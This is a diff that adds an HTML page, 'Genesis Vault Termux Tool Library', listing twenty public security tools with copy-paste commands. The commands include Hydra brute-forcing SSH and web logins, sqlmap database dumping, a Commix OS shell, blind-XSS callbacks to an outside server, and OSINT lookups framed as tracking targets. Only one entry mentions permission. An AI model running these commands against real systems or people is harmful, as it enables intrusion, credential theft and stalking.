@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Termux Tool Library // Genesis Vault</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
+
+  :root {
+    --bg: #080c0f;
+    --bg2: #0d1317;
+    --bg3: #111820;
+    --cyan: #00ffe1;
+    --red: #ff2d55;
+    --green: #00ff88;
+    --yellow: #ffe600;
+    --orange: #ff8800;
+    --muted: #3a4a55;
+    --text: #c8d8e0;
+    --border: #1a2a35;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,225,0.012) 2px, rgba(0,255,225,0.012) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* HEADER */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 900;
+    letter-spacing: 3px;
+    color: #fff;
+  }
+  .logo span { color: var(--cyan); }
+
+  .tool-count {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--cyan);
+    border: 1px solid var(--cyan);
+    padding: 3px 8px;
+    letter-spacing: 2px;
+  }
+
+  /* HERO */
+  .hero {
+    padding: 28px 20px 20px;
+    background: linear-gradient(180deg, rgba(0,255,225,0.04) 0%, transparent 100%);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hero-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--cyan);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+
+  .hero h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: 20px;
+    font-weight: 900;
+    color: #fff;
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+
+  .hero h1 em { color: var(--cyan); font-style: normal; }
+
+  .hero p {
+    font-size: 14px;
+    color: #7a9aaa;
+    line-height: 1.6;
+    margin-bottom: 16px;
+  }
+
+  .hero-stats {
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+
+  .hstat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--green);
+  }
+  .hstat::before { content: '▸ '; }
+
+  /* SEARCH */
+  .search-wrap {
+    padding: 16px 20px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .search-box {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 10px 14px;
+    outline: none;
+    transition: border-color 0.2s;
+    border-radius: 2px;
+  }
+
+  .search-box:focus { border-color: var(--cyan); }
+  .search-box::placeholder { color: var(--muted); }
+
+  /* CATEGORY TABS */
+  .cats {
+    display: flex;
+    overflow-x: auto;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    gap: 0;
+  }
+
+  .cat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    padding: 12px 16px;
+    cursor: pointer;
+    color: var(--muted);
+    border-bottom: 2px solid transparent;
+    white-space: nowrap;
+    background: none;
+    border-left: none;
+    border-right: none;
+    border-top: none;
+    transition: all 0.2s;
+  }
+
+  .cat:hover { color: var(--text); }
+  .cat.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+
+  /* TOOL LIST */
+  .tool-list {
+    padding: 16px 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .tool-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .tool-card:hover { border-color: var(--muted); }
+  .tool-card.open { border-color: var(--cyan); }
+
+  .tool-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px;
+    cursor: pointer;
+    gap: 10px;
+  }
+
+  .tool-left { flex: 1; min-width: 0; }
+
+  .tool-name {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .tool-desc {
+    font-size: 13px;
+    color: #7a9aaa;
+    line-height: 1.4;
+  }
+
+  .tool-meta {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 6px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 2px 7px;
+    border-radius: 1px;
+  }
+
+  .badge-easy { color: var(--green); border: 1px solid var(--green); }
+  .badge-medium { color: var(--yellow); border: 1px solid var(--yellow); }
+  .badge-hard { color: var(--red); border: 1px solid var(--red); }
+
+  .badge-cat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 2px 7px;
+    color: var(--cyan);
+    border: 1px solid rgba(0,255,225,0.3);
+  }
+
+  .expand-icon {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 16px;
+    color: var(--cyan);
+    flex-shrink: 0;
+    transition: transform 0.3s;
+  }
+
+  .tool-card.open .expand-icon { transform: rotate(45deg); }
+
+  /* TOOL BODY */
+  .tool-body {
+    display: none;
+    border-top: 1px solid var(--border);
+    padding: 14px;
+    background: var(--bg3);
+  }
+
+  .tool-card.open .tool-body { display: block; }
+
+  .cmd-block {
+    margin-bottom: 14px;
+  }
+
+  .cmd-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--cyan);
+    margin-bottom: 6px;
+  }
+
+  .cmd-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--cyan);
+    padding: 10px 12px;
+    border-radius: 2px;
+    position: relative;
+  }
+
+  .cmd-box pre {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.7;
+    padding-right: 50px;
+  }
+
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    padding: 4px 8px;
+    background: transparent;
+    border: 1px solid var(--muted);
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+    border-radius: 1px;
+  }
+
+  .copy-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+  .copy-btn.copied { border-color: var(--green); color: var(--green); }
+
+  .usage-note {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: #5a7a8a;
+    line-height: 1.7;
+    padding: 10px 12px;
+    background: rgba(0,255,225,0.03);
+    border: 1px solid rgba(0,255,225,0.08);
+    border-radius: 2px;
+    margin-top: 4px;
+  }
+
+  .usage-note span { color: var(--yellow); }
+
+  /* EMPTY */
+  .empty {
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    padding: 40px 20px;
+    letter-spacing: 2px;
+  }
+
+  /* FOOTER */
+  footer {
+    padding: 20px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: #2a4a5a;
+    letter-spacing: 2px;
+    margin-top: 10px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">GENESIS<span>VAULT</span></div>
+  <div class="tool-count" id="tool-count">20 TOOLS</div>
+</header>
+
+<div class="hero">
+  <div class="hero-tag">// TERMUX TOOL LIBRARY</div>
+  <h1>Termux <em>Tool Library</em></h1>
+  <p>Clone and run the best security tools directly in Termux. Copy commands, paste, done.</p>
+  <div class="hero-stats">
+    <span class="hstat">20 Tools</span>
+    <span class="hstat">5 Categories</span>
+    <span class="hstat">Copy & Paste Ready</span>
+  </div>
+</div>
+
+<div class="search-wrap">
+  <input class="search-box" type="text" id="search" placeholder="// search tools..." oninput="renderTools()">
+</div>
+
+<div class="cats">
+  <button class="cat active" onclick="setcat('all',this)">ALL</button>
+  <button class="cat" onclick="setcat('recon',this)">RECON</button>
+  <button class="cat" onclick="setcat('exploitation',this)">EXPLOIT</button>
+  <button class="cat" onclick="setcat('cracking',this)">CRACKING</button>
+  <button class="cat" onclick="setcat('fuzzing',this)">FUZZING</button>
+  <button class="cat" onclick="setcat('osint',this)">OSINT</button>
+</div>
+
+<div class="tool-list" id="tool-list"></div>
+
+<footer>// GENESIS VAULT MARKETPLACE &nbsp;·&nbsp; TERMUX TOOL LIBRARY v1.0</footer>
+
+<script>
+const TOOLS = [
+  // ── RECON ──
+  {
+    name: 'Nmap',
+    cat: 'recon',
+    diff: 'easy',
+    desc: 'Network scanner. Find open ports, services and OS info on any target.',
+    clone: `pkg install nmap`,
+    install: null,
+    usage: `nmap -sV -sC target.com\nnmap -p- --open target.com\nnmap -A -T4 target.com`,
+    note: '<span>-sV</span> detects service versions · <span>-sC</span> runs default scripts · <span>-p-</span> scans all 65535 ports'
+  },
+  {
+    name: 'Subfinder',
+    cat: 'recon',
+    diff: 'easy',
+    desc: 'Fast passive subdomain discovery using multiple public sources.',
+    clone: `git clone https://github.com/projectdiscovery/subfinder`,
+    install: `cd subfinder/v2/cmd/subfinder\ngo build .\nmv subfinder $PREFIX/bin/`,
+    usage: `subfinder -d target.com\nsubfinder -d target.com -o subs.txt\nsubfinder -d target.com -silent`,
+    note: 'Requires Go — run <span>pkg install golang</span> first · Output to file with <span>-o</span>'
+  },
+  {
+    name: 'Httpx',
+    cat: 'recon',
+    diff: 'easy',
+    desc: 'Probe subdomains for live hosts, status codes, titles and tech stack.',
+    clone: `git clone https://github.com/projectdiscovery/httpx`,
+    install: `cd httpx/cmd/httpx\ngo build .\nmv httpx $PREFIX/bin/`,
+    usage: `cat subs.txt | httpx\ncat subs.txt | httpx -status-code -title\ncat subs.txt | httpx -tech-detect`,
+    note: 'Pipe subfinder output directly → <span>subfinder -d target.com | httpx</span>'
+  },
+  {
+    name: 'Nuclei',
+    cat: 'recon',
+    diff: 'medium',
+    desc: 'Template-based vulnerability scanner. Thousands of community templates.',
+    clone: `git clone https://github.com/projectdiscovery/nuclei`,
+    install: `cd nuclei/cmd/nuclei\ngo build .\nmv nuclei $PREFIX/bin/\nnuclei -update-templates`,
+    usage: `nuclei -u https://target.com\nnuclei -l urls.txt -t cves/\nnuclei -u target.com -severity critical,high`,
+    note: 'Run <span>nuclei -update-templates</span> regularly · Use <span>-severity</span> to filter noise'
+  },
+  {
+    name: 'Waybackurls',
+    cat: 'recon',
+    diff: 'easy',
+    desc: 'Pull all historical URLs for a domain from the Wayback Machine.',
+    clone: `git clone https://github.com/tomnomnom/waybackurls`,
+    install: `cd waybackurls\ngo build .\nmv waybackurls $PREFIX/bin/`,
+    usage: `waybackurls target.com\nwaybackurls target.com | grep "\\.php"\nwaybackurls target.com | grep "admin"`,
+    note: 'Filter for interesting endpoints → <span>grep "api\\|admin\\|upload\\|config"</span>'
+  },
+  {
+    name: 'Amass',
+    cat: 'recon',
+    diff: 'medium',
+    desc: 'In-depth DNS enumeration and attack surface mapping.',
+    clone: `git clone https://github.com/owasp-amass/amass`,
+    install: `cd amass/cmd/amass\ngo build .\nmv amass $PREFIX/bin/`,
+    usage: `amass enum -d target.com\namass enum -passive -d target.com\namass enum -d target.com -o amass.txt`,
+    note: 'Passive mode is quieter · Active mode is more thorough but noisier'
+  },
+
+  // ── EXPLOITATION ──
+  {
+    name: 'Sqlmap',
+    cat: 'exploitation',
+    diff: 'medium',
+    desc: 'Automatic SQL injection detection and exploitation tool.',
+    clone: `git clone https://github.com/sqlmapproject/sqlmap`,
+    install: `cd sqlmap\npkg install python`,
+    usage: `python sqlmap.py -u "https://target.com/page?id=1"\npython sqlmap.py -u "target.com?id=1" --dbs\npython sqlmap.py -u "target.com?id=1" -D dbname --tables`,
+    note: 'Always get permission first · <span>--dbs</span> dumps databases · <span>--tables</span> dumps table names'
+  },
+  {
+    name: 'Dalfox',
+    cat: 'exploitation',
+    diff: 'medium',
+    desc: 'Fast XSS parameter analysis and scanning tool.',
+    clone: `git clone https://github.com/hahwul/dalfox`,
+    install: `cd dalfox\ngo build .\nmv dalfox $PREFIX/bin/`,
+    usage: `dalfox url "https://target.com/search?q=test"\ncat urls.txt | dalfox pipe\ndalfox url "target.com?q=1" --blind https://yourserver.com`,
+    note: 'Use <span>--blind</span> with your callback server to catch blind XSS'
+  },
+  {
+    name: 'XSStrike',
+    cat: 'exploitation',
+    diff: 'medium',
+    desc: 'Advanced XSS detection suite with fuzzing and crawling.',
+    clone: `git clone https://github.com/s0md3v/XSStrike`,
+    install: `cd XSStrike\npkg install python\npip install -r requirements.txt`,
+    usage: `python xsstrike.py -u "https://target.com/search?q=test"\npython xsstrike.py -u "target.com?q=1" --crawl\npython xsstrike.py -u "target.com?q=1" --fuzzer`,
+    note: '<span>--crawl</span> finds all XSS points automatically · <span>--fuzzer</span> tests with custom payloads'
+  },
+  {
+    name: 'Commix',
+    cat: 'exploitation',
+    diff: 'hard',
+    desc: 'Automated command injection and exploitation tool.',
+    clone: `git clone https://github.com/commixproject/commix`,
+    install: `cd commix\npkg install python`,
+    usage: `python commix.py --url="https://target.com/ping?ip=127.0.0.1"\npython commix.py --url="target.com?cmd=test" --os-shell\npython commix.py --url="target.com" --data="ip=127.0.0.1"`,
+    note: 'Targets command injection points in web apps · <span>--os-shell</span> drops into interactive shell'
+  },
+
+  // ── CRACKING ──
+  {
+    name: 'John the Ripper',
+    cat: 'cracking',
+    diff: 'medium',
+    desc: 'Password cracker supporting hundreds of hash types.',
+    clone: `git clone https://github.com/openwall/john`,
+    install: `cd john/src\n./configure && make -s clean && make -sj4\nexport PATH=$PATH:$(pwd)/../run`,
+    usage: `john hashes.txt\njohn --wordlist=rockyou.txt hashes.txt\njohn --format=md5 hashes.txt --wordlist=rockyou.txt`,
+    note: 'Get rockyou.txt → <span>wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span>'
+  },
+  {
+    name: 'Hydra',
+    cat: 'cracking',
+    diff: 'medium',
+    desc: 'Fast online password brute-force tool for login forms and protocols.',
+    clone: `pkg install hydra`,
+    install: null,
+    usage: `hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"\nhydra -l root -P rockyou.txt ssh://target.com\nhydra -L users.txt -P pass.txt ftp://target.com`,
+    note: 'HTTP form: you must specify the <span>failure string</span> at the end · Supports SSH, FTP, HTTP, SMB, and more'
+  },
+  {
+    name: 'Hashcat',
+    cat: 'cracking',
+    diff: 'hard',
+    desc: 'World\'s fastest password recovery using GPU acceleration.',
+    clone: `git clone https://github.com/hashcat/hashcat`,
+    install: `cd hashcat\nmake\nmv hashcat $PREFIX/bin/`,
+    usage: `hashcat -m 0 hash.txt rockyou.txt\nhashcat -m 1800 hash.txt rockyou.txt\nhashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a`,
+    note: '<span>-m 0</span> = MD5 · <span>-m 1800</span> = SHA-512 · <span>-a 3</span> = brute force mask attack'
+  },
+
+  // ── FUZZING ──
+  {
+    name: 'Ffuf',
+    cat: 'fuzzing',
+    diff: 'easy',
+    desc: 'Fast web fuzzer for directories, files, parameters and vhosts.',
+    clone: `git clone https://github.com/ffuf/ffuf`,
+    install: `cd ffuf\ngo build .\nmv ffuf $PREFIX/bin/`,
+    usage: `ffuf -u https://target.com/FUZZ -w wordlist.txt\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200\nffuf -u https://target.com/?FUZZ=test -w params.txt`,
+    note: '<span>FUZZ</span> is the placeholder · <span>-mc 200</span> shows only 200 responses · Great for finding hidden endpoints'
+  },
+  {
+    name: 'Gobuster',
+    cat: 'fuzzing',
+    diff: 'easy',
+    desc: 'Directory and DNS brute-forcing tool written in Go.',
+    clone: `git clone https://github.com/OJ/gobuster`,
+    install: `cd gobuster\ngo build .\nmv gobuster $PREFIX/bin/`,
+    usage: `gobuster dir -u https://target.com -w wordlist.txt\ngobuster dir -u target.com -w wordlist.txt -x php,html,txt\ngobuster dns -d target.com -w subdomains.txt`,
+    note: '<span>-x</span> adds file extensions · <span>dns</span> mode for subdomain brute forcing'
+  },
+  {
+    name: 'Wfuzz',
+    cat: 'fuzzing',
+    diff: 'medium',
+    desc: 'Web application fuzzer for finding hidden resources and vulnerabilities.',
+    clone: `git clone https://github.com/xmendez/wfuzz`,
+    install: `cd wfuzz\npkg install python\npip install wfuzz`,
+    usage: `wfuzz -c -z file,wordlist.txt https://target.com/FUZZ\nwfuzz -c -z file,wordlist.txt --hc 404 target.com/FUZZ\nwfuzz -c -z file,wordlist.txt -d "user=FUZZ&pass=test" target.com/login`,
+    note: '<span>--hc 404</span> hides 404 responses · <span>-d</span> fuzzes POST data · Great for parameter fuzzing'
+  },
+  {
+    name: 'Dirb',
+    cat: 'fuzzing',
+    diff: 'easy',
+    desc: 'Classic web content scanner. Simple and reliable.',
+    clone: `pkg install dirb`,
+    install: null,
+    usage: `dirb https://target.com\ndirb https://target.com /usr/share/dirb/wordlists/big.txt\ndirb https://target.com -X .php,.html,.txt`,
+    note: 'Built-in wordlists at <span>/usr/share/dirb/wordlists/</span> · Use <span>-X</span> for extensions'
+  },
+
+  // ── OSINT ──
+  {
+    name: 'Sherlock',
+    cat: 'osint',
+    diff: 'easy',
+    desc: 'Hunt down social media accounts by username across 300+ platforms.',
+    clone: `git clone https://github.com/sherlock-project/sherlock`,
+    install: `cd sherlock\npkg install python\npip install -r requirements.txt`,
+    usage: `python sherlock.py username\npython sherlock.py username --timeout 10\npython sherlock.py user1 user2 user3`,
+    note: 'Great for tracking targets across platforms · Results saved to <span>username.txt</span>'
+  },
+  {
+    name: 'TheHarvester',
+    cat: 'osint',
+    diff: 'easy',
+    desc: 'Gather emails, subdomains, IPs and URLs from public sources.',
+    clone: `git clone https://github.com/laramies/theHarvester`,
+    install: `cd theHarvester\npkg install python\npip install -r requirements/base.txt`,
+    usage: `python theHarvester.py -d target.com -b google\npython theHarvester.py -d target.com -b all\npython theHarvester.py -d target.com -b linkedin`,
+    note: '<span>-b all</span> uses all sources · <span>-b google,bing</span> for specific sources'
+  },
+  {
+    name: 'Holehe',
+    cat: 'osint',
+    diff: 'easy',
+    desc: 'Check if an email is registered on 120+ websites efficiently.',
+    clone: `git clone https://github.com/megadose/holehe`,
+    install: `cd holehe\npkg install python\npip install holehe`,
+    usage: `holehe target@email.com\nholehe target@email.com --only-used\nholehe target@email.com -C`,
+    note: '<span>--only-used</span> shows only sites where email is registered · Fast and stealthy'
+  },
+  {
+    name: 'Photon',
+    cat: 'osint',
+    diff: 'medium',
+    desc: 'Fast crawler that extracts URLs, emails, files, keys and secrets from websites.',
+    clone: `git clone https://github.com/s0md3v/Photon`,
+    install: `cd Photon\npkg install python\npip install -r requirements.txt`,
+    usage: `python photon.py -u https://target.com\npython photon.py -u target.com --level 3\npython photon.py -u target.com -t 50 --keys`,
+    note: '<span>--keys</span> looks for API keys and secrets · <span>--level</span> sets crawl depth'
+  }
+];
+
+let currentCat = 'all';
+
+function setcat(cat, el) {
+  currentCat = cat;
+  document.querySelectorAll('.cat').forEach(c => c.classList.remove('active'));
+  el.classList.add('active');
+  renderTools();
+}
+
+function renderTools() {
+  const q = document.getElementById('search').value.toLowerCase();
+  const list = document.getElementById('tool-list');
+
+  let filtered = TOOLS.filter(t => {
+    const matchCat = currentCat === 'all' || t.cat === currentCat;
+    const matchQ = !q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q) || t.cat.includes(q);
+    return matchCat && matchQ;
+  });
+
+  document.getElementById('tool-count').textContent = filtered.length + ' TOOLS';
+
+  if (!filtered.length) {
+    list.innerHTML = '<div class="empty">// NO TOOLS FOUND</div>';
+    return;
+  }
+
+  list.innerHTML = filtered.map((t, i) => `
+    <div class="tool-card" id="card-${i}">
+      <div class="tool-header" onclick="toggle(${i})">
+        <div class="tool-left">
+          <div class="tool-name">${t.name}</div>
+          <div class="tool-desc">${t.desc}</div>
+          <div class="tool-meta">
+            <span class="badge badge-${t.diff}">${t.diff.toUpperCase()}</span>
+            <span class="badge-cat">${t.cat.toUpperCase()}</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="tool-body">
+        <div class="cmd-block">
+          <div class="cmd-label">// INSTALL</div>
+          <div class="cmd-box">
+            <pre id="clone-${i}">${t.clone}</pre>
+            <button class="copy-btn" onclick="copyCmd('clone-${i}', this)">COPY</button>
+          </div>
+        </div>
+        ${t.install ? `
+        <div class="cmd-block">
+          <div class="cmd-label">// SETUP</div>
+          <div class="cmd-box">
+            <pre id="install-${i}">${t.install}</pre>
+            <button class="copy-btn" onclick="copyCmd('install-${i}', this)">COPY</button>
+          </div>
+        </div>` : ''}
+        <div class="cmd-block">
+          <div class="cmd-label">// USAGE</div>
+          <div class="cmd-box">
+            <pre id="usage-${i}">${t.usage}</pre>
+            <button class="copy-btn" onclick="copyCmd('usage-${i}', this)">COPY</button>
+          </div>
+        </div>
+        ${t.note ? `<div class="usage-note">▸ ${t.note}</div>` : ''}
+      </div>
+    </div>
+  `).join('');
+}
+
+function toggle(i) {
+  const card = document.getElementById('card-' + i);
+  card.classList.toggle('open');
+}
+
+function copyCmd(id, btn) {
+  const text = document.getElementById(id).textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'COPIED ✓';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'COPY';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+renderTools();
+</script>
+</body>
+</html>
